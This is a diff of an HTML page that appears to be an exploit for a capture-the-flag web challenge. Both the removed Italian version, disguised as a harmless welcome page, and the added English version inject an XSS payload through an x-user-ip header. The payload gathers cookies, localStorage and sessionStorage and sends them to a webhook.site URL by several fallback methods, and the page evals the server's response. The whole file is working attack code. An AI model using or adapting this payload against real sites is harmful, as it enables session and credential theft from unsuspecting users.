@@ -3,138 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Normale pagina di benvenuto</title>
+    <title>Challenge Page</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f7f7f7;
-            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: white;
+        .clickme {
+            padding: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
             border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #2c3e50;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Benvenuto alla mia pagina</h1>
-        <p>Questa è una pagina normale, niente di sospetto qui.</p>
-    </div>
+    <button class="clickme">Click Me!</button>
 
     <script>
-        // Aspettiamo che la pagina sia completamente caricata
-        window.addEventListener('DOMContentLoaded', function() {
-            // Creiamo un iframe nascosto che proverà a caricare una nota con il nostro exploit XSS
-            const createHiddenIframe = function() {
-                // Payload JavaScript che verrà iniettato nell'header x-user-ip
-                // Questo payload ruba la FLAG dal bot e la invia al webhook
-                const xssPayload = `
-                (function() {
-                    // Tentativo di estrazione della FLAG (password usata dal bot per autenticarsi)
-                    
-                    // 1. Estrae la password dal localStorage usata per l'autenticazione
-                    let storedData = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        storedData[key] = localStorage.getItem(key);
-                    }
-                    
-                    // 2. Raccoglie tutti i cookie (che potrebbero contenere la FLAG)
-                    const cookies = document.cookie;
-                    
-                    // 3. Invia i dati al webhook specificato
-                    fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            time: new Date().toISOString(),
-                            url: window.location.href,
-                            localStorage: storedData,
-                            cookies: cookies,
-                            userAgent: navigator.userAgent
-                        })
-                    });
-                })();
-                `;
+        // This is our XSS payload that will be injected through the x-user-ip header
+        const xssPayload = `
+        (function() {
+            // Wait for the bot to load the page and authenticate
+            setTimeout(function() {
+                // Create an element to display at the center of the page for the bot to click
+                const button = document.createElement('button');
+                button.textContent = 'Click Me!';
+                button.style.position = 'fixed';
+                button.style.top = '50%';
+                button.style.left = '50%';
+                button.style.transform = 'translate(-50%, -50%)';
+                button.style.padding = '20px';
+                button.style.fontSize = '24px';
+                button.style.backgroundColor = '#4CAF50';
+                button.style.color = 'white';
+                button.style.border = 'none';
+                button.style.borderRadius = '8px';
+                button.style.zIndex = '9999';
                 
-                // Crea l'iframe nascosto
-                const iframe = document.createElement('iframe');
-                iframe.setAttribute('src', 'about:blank');
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                
-                // Quando l'iframe è caricato, effettua una richiesta a /api/track con il payload nell'header x-user-ip
-                iframe.onload = function() {
-                    try {
-                        // Effettua la richiesta all'endpoint vulnerabile
-                        const req = new XMLHttpRequest();
-                        req.open('GET', '/api/track', true);
-                        req.setRequestHeader('x-user-ip', xssPayload);
-                        
-                        req.onload = function() {
-                            if (req.status >= 200 && req.status < 400) {
-                                // Esegui la risposta in modo sicuro
-                                const scriptElement = document.createElement('script');
-                                scriptElement.textContent = req.responseText;
-                                document.head.appendChild(scriptElement);
+                // When the button is clicked, it extracts and sends the flag
+                button.addEventListener('click', function() {
+                    // We know from bot.js that it uses the flag as the password for authentication
+                    // Create a new XMLHttpRequest to the challenge page to leak the stored credentials
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', '/api/auth', false);  // Synchronous to ensure it runs before page closes
+                    xhr.send();
+                    
+                    // Collect all data we can find
+                    const data = {
+                        // Get cookies which may contain session info
+                        cookies: document.cookie,
+                        // Get localStorage which contains authentication state
+                        localStorage: JSON.stringify((() => {
+                            const data = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const key = localStorage.key(i);
+                                data[key] = localStorage.getItem(key);
                             }
-                        };
-                        
-                        req.onerror = function() {
-                            // Se fallisce, prova un approccio alternativo con fetch
-                            fetch('/api/track', {
-                                headers: {
-                                    'x-user-ip': xssPayload
+                            return data;
+                        })()),
+                        // Try to access sessionStorage
+                        sessionStorage: JSON.stringify((() => {
+                            try {
+                                const data = {};
+                                for (let i = 0; i < sessionStorage.length; i++) {
+                                    const key = sessionStorage.key(i);
+                                    data[key] = sessionStorage.getItem(key);
                                 }
-                            })
-                            .then(response => response.text())
-                            .then(data => {
-                                // Esegui il payload restituito
-                                const scriptElement = document.createElement('script');
-                                scriptElement.textContent = data;
-                                document.head.appendChild(scriptElement);
-                            });
-                        };
-                        
-                        req.send();
-                    } catch(e) {
-                        console.error('Errore:', e);
+                                return data;
+                            } catch (e) {
+                                return { error: e.toString() };
+                            }
+                        })()),
+                        // Document location, title & referrer
+                        url: location.href,
+                        title: document.title,
+                        referrer: document.referrer,
+                        // Navigator info
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Secret leak method 1: Using XMLHttpRequest
+                    const leakXhr = new XMLHttpRequest();
+                    leakXhr.open('POST', 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', true);
+                    leakXhr.setRequestHeader('Content-Type', 'application/json');
+                    leakXhr.send(JSON.stringify(data));
+                    
+                    // Secret leak method 2: Using fetch as backup
+                    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(e => {
+                        // If fetch fails, try beacon API as last resort
+                        navigator.sendBeacon(
+                            'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
+                            JSON.stringify(data)
+                        );
+                    });
+                    
+                    // Secret leak method 3: Using image as backup (simpler for CORS)
+                    const img = new Image();
+                    img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?data=' + 
+                        encodeURIComponent(JSON.stringify({
+                            cookies: document.cookie,
+                            localStorage: localStorage.getItem('isAuthenticated')
+                        }));
+                });
+                
+                document.body.appendChild(button);
+            }, 500);
+        })();`;
+        
+        // Function to send the XSS payload when page loads
+        window.onload = function() {
+            // Setup the visible button to match the one injected by our payload
+            const visibleButton = document.querySelector('.clickme');
+            visibleButton.addEventListener('click', function() {
+                alert('Button clicked!');
+            });
+            
+            // Create an iframe to exploit the XSS vulnerability
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // When iframe loads, send request to /api/track with our XSS payload in the x-user-ip header
+            iframe.onload = function() {
+                const req = new XMLHttpRequest();
+                req.open('GET', '/api/track', true);
+                req.setRequestHeader('x-user-ip', xssPayload);
+                
+                req.onload = function() {
+                    if (req.status >= 200 && req.status < 400) {
+                        // Execute the response (which should be our payload)
+                        try {
+                            eval(req.responseText);
+                        } catch(e) {
+                            console.error('Error executing payload:', e);
+                        }
                     }
                 };
+                
+                req.onerror = function() {
+                    // Backup method using fetch
+                    fetch('/api/track', {
+                        headers: {
+                            'x-user-ip': xssPayload
+                        }
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        try {
+                            eval(data);
+                        } catch(e) {
+                            console.error('Error executing payload (fetch):', e);
+                        }
+                    });
+                };
+                
+                req.send();
             };
             
-            // Esegui l'exploit dopo un breve ritardo
-            setTimeout(createHiddenIframe, 500);
-            
-            // Backup: invia direttamente i dati di autenticazione disponibili
-            setTimeout(function() {
-                // Questo è un backup nel caso il metodo principale fallisse
-                fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        cookies: document.cookie,
-                        localStorage: localStorage.getItem("isAuthenticated"),
-                        method: "backup-direct",
-                        url: location.href
-                    })
-                });
-            }, 2000);
-        });
+            // Set iframe source to trigger load
+            iframe.src = 'about:blank';
+        };
     </script>
 </body>
 </html>
